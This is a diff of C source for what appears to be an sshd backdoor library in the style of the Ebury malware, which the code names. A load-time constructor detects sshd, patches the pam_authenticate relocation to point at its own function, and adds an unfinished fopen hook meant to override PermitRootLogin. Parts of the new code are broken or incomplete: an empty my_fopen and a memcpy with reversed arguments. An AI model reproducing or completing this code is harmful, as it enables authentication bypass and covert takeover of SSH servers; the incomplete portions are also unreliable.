@@ -56,7 +56,7 @@ static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
 						return tmp;
 					}
 				}
-				libstart += 16; /* XXX: testme += 64 */
+				libstart += 16;
 			}
 		}
 		map = map->l_next;
@@ -89,6 +89,11 @@ static void *get_libstart(struct link_map *link_map, char *lib)
 static void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
 					 uint64_t **RELASZ, Elf64_Rela **JMPREL, uint64_t **PLTRELSZ)
 {
+	*RELA = NULL;
+	*RELASZ = NULL;
+	*JMPREL = NULL;
+	*PLTRELSZ = NULL;	
+
 	int i;
 
 	for (i = 0; i < elements; i++) {
@@ -112,7 +117,7 @@ static void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
  *
  * works in 3.2.0-4 openssh_6.0pl YMMV
  */
-static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func)
+static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, int *type)
 {
 	uint64_t relaments = *RELASZ / (sizeof(Elf64_Rela));
 
@@ -122,8 +127,10 @@ static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func)
 
 	int i;
 	for (i = 0; i < relaments; i++) {
-		if ((void *) RELA[0].r_addend == func)
+		if ((void *) RELA[0].r_addend == func) {
+			*type = RELOC_ADDEND;
 			return RELA;
+		}
 
 		shift32 = (uintptr_t) (ELF64_R_SYM(RELA[0].r_info)) << 32;
 		low32 = (uintptr_t) (ELF64_R_TYPE(RELA[0].r_info)) & 0xFFFFFFFF;
@@ -137,15 +144,6 @@ static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func)
 	}
 	return NULL;
 }
-
-/*
- * parses the relocation table only associated with PLT entries (DT_PLTREL)
- *
- * don't think this is needed -- in either DT_RELA or DT_PLTREL it looks like the relocation method 
- *	is either an absolute address at r_addend or the bitwise logic shown above
- * TODO: axe me?
- */
-static Elf64_Rela *parse_jmprel(Elf64_Rela *JMPREL, uint64_t *PLTRELSZ, void *func);
 
 /*
  * the callback for dl_iterate_phdr
@@ -179,9 +177,9 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 }
 
 /*
- * this function is simple, the work is all in the functions that lead to this
+ * we will need another hook -- for the relocations that use bitwise logic
  */
-static int hook_rela(Elf64_Rela *foundrela, void *func)
+static int hook_rela_addend(Elf64_Rela *foundrela, void *func)
 {
 	int ret;
 	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;
@@ -190,7 +188,7 @@ static int hook_rela(Elf64_Rela *foundrela, void *func)
 	if (ret != 0)
 		return -1;
 
-	foundrela->r_addend = (signed long long)func; 
+	foundrela->r_addend = (unsigned long long)func; 
 
 	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
 	if (ret != 0)
@@ -210,7 +208,7 @@ static int is_sshd(struct link_map *link_map)
 	dladdrptr = dlsym(dlhandle, "dladdr");
 	dlclose(dlhandle);
 
-	if (!dlinfoptr || !dladdrptr)
+	if (dlinfoptr == NULL || dladdrptr == NULL)
 		return -1;
 
 	void *ourhandle = dlopen(NULL, RTLD_NOW);
@@ -220,18 +218,18 @@ static int is_sshd(struct link_map *link_map)
 
 	void *wrapstart = get_libstart(link_map, "libwrap.so.0");
 
-	if (!wrapstart)
+	if (wrapstart == NULL)
 		return -1;
 
 	void *pamstart = get_libstart(link_map, "libpam.so.0");
 
-	if (!pamstart)
+	if (pamstart == NULL)
 		return -1;
 
 	void *hosts_access = find_func_ptr(link_map, wrapstart, "hosts_access");
 	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");
 
-	if (!hosts_access || !pam_authenticate)
+	if (hosts_access == NULL || pam_authenticate == NULL)
 		return -1;
 
 	return 0;
@@ -268,6 +266,24 @@ static int my_pam_auth(struct pam_handle *pamh, int flags)
 	return 0;
 }
 
+/*
+ *
+ */
+Elf64_Rela *ref_fopen_Rela;
+
+FILE *my_fopen(char *filename, char *mode)
+{
+
+
+
+
+
+
+
+
+
+}
+
 static void  __attribute__ ((constructor)) init(void)
 {
 	struct link_map *link_map;
@@ -287,22 +303,23 @@ static void  __attribute__ ((constructor)) init(void)
 	dlclose(o);
 	dl_iterate_phdrptr(callback, NULL);
 
-	if (!null1)
+	if (null1 == NULL)
 		return;
 
 
 	Elf64_Rela *RELA, *JMPREL;
 	uint64_t *RELASZ, *PLTRELSZ;
+	int type;
 
 	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
-	if (!RELA || !RELASZ || !JMPREL || !PLTRELSZ)
+	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
 		return;
 
 	void *pamstart = get_libstart(link_map, "libpam.so.0");
 	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");
 
-	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, pam_authenticate);
-	if (!foundrela)
+	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, pam_authenticate, &type);
+	if (foundrela == NULL)
 		return;
 
 	int jmpret = setjmp(jmpbuf);
@@ -314,11 +331,42 @@ static void  __attribute__ ((constructor)) init(void)
 	signal(SIGSEGV, handle_sig_with_jmp);
 	signal(SIGBUS, handle_sig_with_jmp);
 
-	hook_rela(foundrela, my_pam_auth);
+	/* TODO: test type (parse_rela() paramter) */
+	hook_rela_addend(foundrela, my_pam_auth);
 
 	signal(SIGSEGV, SIG_DFL);
 	signal(SIGBUS, SIG_DFL);
 
+
+/*	begin experiments -- fixing PermitRootLogin
+		how the hell did the original Ebury guys do this? */
+
+
+	void *libcstart = get_libstart(link_map, "libc.so.6");
+	void *libc_func = find_func_ptr(link_map, libcstart, "fopen");
+
+	/* the relocation of fopen lives within sshd's dynamic */
+	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
+		return;
+
+
+
+
+	foundrela = parse_rela(RELA, RELASZ, libc_func, &type);
+	if (foundrela == NULL)
+		foundrela = parse_rela(JMPREL, PLTRELSZ, libc_func, &type);
+
+
+	ref_fopen_Rela = malloc(sizeof(Elf64_Rela));
+	memcpy(foundrela, ref_fopen_Rela, sizeof(Elf64_Rela));
+
+
+
+
+
 	
+
+	free(ref_fopen_Rela);	
 	return;
 }
